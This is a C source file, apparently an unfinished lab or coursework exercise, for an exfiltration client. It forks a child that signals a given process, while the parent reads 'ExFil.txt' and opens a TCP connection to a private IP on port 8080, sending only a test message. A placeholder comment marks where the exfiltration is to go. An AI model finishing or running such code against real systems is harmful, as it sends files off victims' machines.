#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include "fileops.h"
#include <arpa/inet.h>      // For sockaddr_in, inet_pton
#define PORT 8080           // Port number server is listening on
#define BUFFER_SIZE 1024 

int main(int argc, char *argv[])
{

    // Step 2: Fork the process
    pid_t pid = fork();

    if (pid > 0) { 
        // Parent process

        //NEED TO INPUT EXFILTRATION FUNCTION HERE
        char buffer[BUFFER_SIZE];
        FILE *fp = fopen("ExFil.txt", "r");
        size_t bytesRead = fread(buffer, 1, BUFFER_SIZE - 1, fp);
        buffer[bytesRead] = '\0';   
        fclose(fp);          // file descriptors: fd[0] for read, fd[1] for write
        
        int client_fd;                              // File descriptor for client socket
        struct sockaddr_in server_addr;             // Server address structure


    // ----------------------
    // Create TCP socket
    // ----------------------
    client_fd = socket(AF_INET, SOCK_STREAM, 0); // AF_INET = IPv4, SOCK_STREAM = TCP
    if (client_fd < 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // ----------------------
    // Configure server address
    // ----------------------
    memset(&server_addr, 0, sizeof(server_addr)); // Clear memory (good practice)
    server_addr.sin_family = AF_INET;             // IPv4
    server_addr.sin_port = htons(PORT);           // Convert port to network byte order

    // Convert human-readable IP address to binary form
    // Change "127.0.0.1" if your server is on another machine
    if (inet_pton(AF_INET, "10.60.117.167", &server_addr.sin_addr) <= 0) {
        perror("invalid address");
        close(client_fd);
        exit(EXIT_FAILURE);
    }

    // ----------------------
    // Connect to server
    // ----------------------
    if (connect(client_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect failed");
        close(client_fd);
        exit(EXIT_FAILURE);
    }

    printf("Connected to server.\n");

    // ----------------------
    // Send message to the server
    // ----------------------
    const char *message = "Hello from client!";
    if(write(client_fd, message, strlen(message)) < 0) {
        perror("write failed");
    }


    // ----------------------
    // Close connection
    // ----------------------
    close(client_fd);

                
    return 0; 
    } 
    else { 
        // Child process

        kill(atoi(argv[1]), SIGUSR1); //Converts string into int
        sleep(3); 

    }
    return 0;
}